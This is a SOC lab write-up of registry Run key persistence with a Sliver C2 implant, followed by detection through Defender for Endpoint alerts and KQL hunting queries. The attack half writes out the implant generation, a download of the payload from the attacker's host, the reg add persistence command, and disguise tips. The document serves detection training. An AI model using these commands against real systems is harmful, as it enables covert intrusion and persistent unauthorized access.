# Run Key Persistence via Sliver C2  
**Technique: [T1547.001 – Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)**

The Windows Registry is a prime target for attackers seeking user-level persistence. This technique abuses the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key, causing the payload to automatically execute each time the user signs in.

This test uses a [Sliver C2](https://github.com/BishopFox/sliver) payload to simulate adversary behavior, with [Microsoft Defender for Endpoint (MDE)](https://www.microsoft.com/en-us/security/business/threat-protection/microsoft-defender-endpoint) active on the target.

> Threat groups like APT29, FIN7, and Lazarus have been observed using this technique due to its reliability, stealth, and survivability across reboots.

---

## Host Configuration

- **Attacker VM:** `HR-COMPLAINTS` (Sliver C2 on Ubuntu 22.04)
  - **IP:** `10.1.0.51`
- **Target VM:** `CEO-LAPTOP` (Windows 10 with MDE onboarded)
  - **IP:** `10.1.0.69`
  - **Admin Username:** `TrustMeBro`


---

<details>
<summary><strong>🔹 Step 1: Generate and Host Payload (Attacker VM)</strong></summary>

&nbsp;

From `HR-COMPLAINTS`, we generate a Windows executable using [Sliver C2](https://github.com/BishopFox/sliver):

```
# Start Sliver
sudo sliver

# Inside Sliver console:
generate --os windows --format exe --name WindowsTelemetryService --http https://10.1.0.51
```

> `WindowsTelemetryService.exe` is a disguised payload name to blend in with legitimate telemetry binaries often found on Windows systems.


<img width="1007" height="201" alt="sliver_generate_payload" src="https://github.com/user-attachments/assets/cfb4d05f-6847-4d54-82d8-611da2983b52" />

Next, host the payload via Python on port 80 (commonly allowed traffic):

```
sudo python3 -m http.server 80
```

</details>

---

<details>
<summary><strong>🔹 Step 2: Download Payload & Add Run Key (Target VM)</strong></summary>

&nbsp;

From `CEO-LAPTOP`, use PowerShell to download the payload:

```
wget "http://10.1.0.51/WindowsTelemetryService.exe" -OutFile "C:\ProgramData\WindowsTelemetryService.exe"
``` 
> The payload is saved to `C:\ProgramData`, a legitimate, writable directory used by many applications for storing data.  
> This location is often overlooked by users, doesn’t require elevated permissions, and may not trigger the same suspicion as more obvious paths like `Downloads` or `Temp`.  
> According to threat reports, attackers commonly abuse `ProgramData` for hiding payloads.


Then add it to the Run key:

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "WindowsTelemetryService" /t REG_SZ /F /D "C:\ProgramData\WindowsTelemetryService.exe"
```

> This causes the payload to execute every time the user signs in. The `HKCU` hive applies to the current user only (commonly abused in malware that operates without needing elevated privileges).


<img width="1220" height="173" alt="creating_registry_persistence" src="https://github.com/user-attachments/assets/12f77654-9af0-4cdd-8064-2bd992539168" />

</details>

---

<details>
<summary><strong>🔹 Step 3: Reboot & Observe Callback</strong></summary>

&nbsp;

Sign out and back into the `TrustMeBro` user session on `CEO-LAPTOP`. Sliver should receive a callback, establishing a new session tied to the registry-based persistence mechanism.  

<img width="451" height="240" alt="signing_out_of_windows_host" src="https://github.com/user-attachments/assets/fa2e9ff8-3183-4016-8f2d-e8e1f032e23c" />  

&nbsp;
We can verify the beacon using:

```
sessions
```


This confirms successful execution of the backdoor through the `HKCU\Run` registry key.  

<img width="1728" height="231" alt="established_session_registry_persistence_on_sign_in" src="https://github.com/user-attachments/assets/df833feb-7ef2-43f1-aca6-12dbff3a2af8" />  

<img width="1638" height="265" alt="established_session_registry_persistence_on_sign_in_2" src="https://github.com/user-attachments/assets/91cebbe2-6137-4f55-aaf9-ea9e39f333d8" />  

> This session was created after triggering the Registry run key. We can see the unique session ID, which is a randomly generated GUID (a.k.a UUID).
> Only the first part of the GUID is shown in this output.

</details>  

---  

## Alert Triage via Microsoft Defender for Endpoint (MDE)

From the MDE portal, we navigate to **Incidents & Alerts** to review detections related to our persistence activity.

- Defender generated an incident tied to `WindowsTelemetryService.exe`
- The alert noted unusual persistence behavior which was flagged as *"Persistence via Run Key"* and *"Startup Folder Executable Execution"*
- The alerts were linked to the user `TrustMeBro` and the device `CEO-LAPTOP`
- Timestamps aligned closely with our simulated sign-in events

<img width="1784" height="153" alt="checking_mde_incidents_tab_reg_key" src="https://github.com/user-attachments/assets/275c1ef5-36c3-4d37-b4b8-c964faee15c6" />


These detections show that MDE is aware of these persistence vectors, and considers the user's registry run keys a senstive area.  

If we check the timeline on this host, we find not just the alerts that were triggered, but gain additional context of what happened minutes before:  
<img width="1854" height="327" alt="entire_attack_timeline" src="https://github.com/user-attachments/assets/015dc073-a5ba-4da8-9544-49e2dc932b2d" />  

In the image above, we can see a suspicious download from PowerShell from a remote internal host, `10.1.0.51:80`.


> While it's valuable that alerts were triggered, advanced attackers often find ways to bypass default detections.

---  

## Pivoting to KQL Hunting

Next, we'll use **custom KQL queries** to validate, expand, and contextualize what MDE saw.

Our first hunt focuses on **Registry Run Key modifications**, looking for entries under the classic `*\Run` path:

```kql
DeviceRegistryEvents
| where RegistryKey has @"\Microsoft\Windows\CurrentVersion\Run"
| where ActionType == "RegistryValueSet"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| sort by Timestamp desc
```

<img width="1217" height="662" alt="kql_run_key_modifications" src="https://github.com/user-attachments/assets/45f626ab-6545-4a1d-b969-316e80e8a67b" />  

This quickly surfaces our suspicious entry:

- **RegistryValueName:** `WindowsTelemetryService`
- **RegistryValueData:** `C:\ProgramData\WindowsTelemetryService.exe`
- **InitiatingProcess:** `reg.exe`, run by `TrustMeBro`

This gives us full visibility into what was written, by whom, and when.  

### Confirming Execution of the Suspicious Binary

Now that we know the payload was written to disk, the next logical question is:

> “Did it actually execute?”

We query for executions of `WindowsTelemetryService.exe`:

```kql
DeviceProcessEvents
| where FileName =~ "WindowsTelemetryService.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessFileName
| sort by Timestamp desc
```

This query confirms **two executions** of `WindowsTelemetryService.exe` — one for each persistence method:

- **Autorun via Registry Run Key**
- **Startup Folder Drop**

> I tested both methods during this simulation so you’ll see evidence of each.
> 👉 For full context on the **Startup Folder** technique seen below, 
see the [startup_folder_persistence_sliver_c2.md](https://github.com/j-manli/soc-analyst-notebook/blob/main/investigations/startup_folder_persistence_sliver_c2.md) writeup.

<img width="1708" height="435" alt="pivoting_did_executable_run_kql" src="https://github.com/user-attachments/assets/da45b3ff-067d-4d6c-a327-e5ca53ba7e54" />  

---

### How Did This File Get Here?

With execution confirmed, the next question becomes:  
**Was this payload dropped manually or downloaded from a remote host?**

We use a `DeviceNetworkEvents` query to investigate outbound network activity from `CEO-LAPTOP` during the relevant window:

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where Timestamp between (datetime(2025-07-13 02:30:00) .. datetime(2025-07-13 02:45:00))
| project Timestamp, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

<img width="1141" height="365" alt="network_connection_powershell_discovery_kql" src="https://github.com/user-attachments/assets/a88a714e-ac88-4a97-be0a-40e00c25603e" />


This revealed a connection to the attacker's IP (`10.1.0.51`) on `port 80`, initiated via `PowerShell`.  

---

### Investigate Communication with `10.1.0.51`?

To build a fuller picture of malicious activity, we pivoted on the remote IP `10.1.0.51` — the attacker's host — to identify any other connections from `CEO-LAPTOP`:

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where RemoteIP == "10.1.0.51"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<img width="1699" height="629" alt="powershell_and_suspicious_process_remote_connection_kql" src="https://github.com/user-attachments/assets/fa6ec06b-64c6-4184-99f1-134068f359a9" />

This revealed multiple outbound connections initiated by `powershell.exe`, confirming the payload delivery and beaconing behavior.  

> Again, note that this output included a test for Startup Folder persistence which is why there are multiple callbacks.

Notably:
- The connection occurred shortly after persistence was established.
- The `InitiatingProcessFileName` confirms use of `WindowsTelemetryService.exe` and corresponds TCP connections to `RemoteIP: 10.1.0.51:443`
- Evidence of download from that same `RemoteIP` over `port 80`

Together, this ties process execution, file delivery, and outbound C2 into a single timeline.

## Takeaways

This scenario demonstrated how adversaries can maintain persistence using simple, low-noise autorun techniques to regain access after reboot. Microsoft Defender for Endpoint flagged some activity, but critical links between execution and callback required further investigation.
